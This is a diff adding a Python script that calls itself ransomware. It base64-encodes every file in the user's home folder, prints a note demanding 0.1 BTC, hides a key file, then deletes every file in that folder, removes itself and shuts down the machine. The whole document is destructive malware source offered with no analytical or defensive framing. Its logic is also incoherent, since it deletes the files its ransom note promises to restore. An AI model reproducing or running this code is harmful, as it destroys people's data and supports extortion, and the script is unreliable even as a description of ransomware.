@@ -1,0 +1,63 @@
+import os
+import sys
+import base64
+import threading
+import time
+import subprocess
+
+# Function to encrypt a file
+def encrypt_file(file_path):
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    encrypted_data = base64.b64encode(data).decode()
+    with open(file_path, 'w') as f:
+        f.write(encrypted_data)
+
+# Function to decrypt a file
+def decrypt_file(file_path, key):
+    with open(file_path, 'r') as f:
+        encrypted_data = f.read()
+    decrypted_data = base64.b64decode(encrypted_data.encode()).decode()
+    with open(file_path, 'w') as f:
+        f.write(decrypted_data)
+
+# Function to start the ransomware
+def start_ransomware():
+    # Encrypt all files on the system
+    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path)
+
+    # Display a ransom note
+    ransom_note = """
+    All of your files have been encrypted with a special key.
+    To decrypt your files, send 0.1 BTC to the following address:
+    [REDACTED]
+    """
+    print(ransom_note)
+
+    # Create a hidden directory to store the decryption key
+    hidden_dir = os.path.join(os.environ['USERPROFILE'], '.hidden_dir')
+    os.makedirs(hidden_dir, exist_ok=True)
+
+    # Write the decryption key to a file
+    key_path = os.path.join(hidden_dir, 'decryption_key.txt')
+    with open(key_path, 'w') as f:
+        f.write('[REDACTED]')
+
+    # Delete all files on the system
+    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
+        for file in files:
+            file_path = os.path.join(root, file)
+            os.remove(file_path)
+
+    # Delete the script
+    os.remove(sys.argv[0])
+
+    # Shutdown the system
+    os.system('shutdown /s /t 0')
+
+# Start the ransomware
+if __name__ == '__main__':
+    start_ransomware()
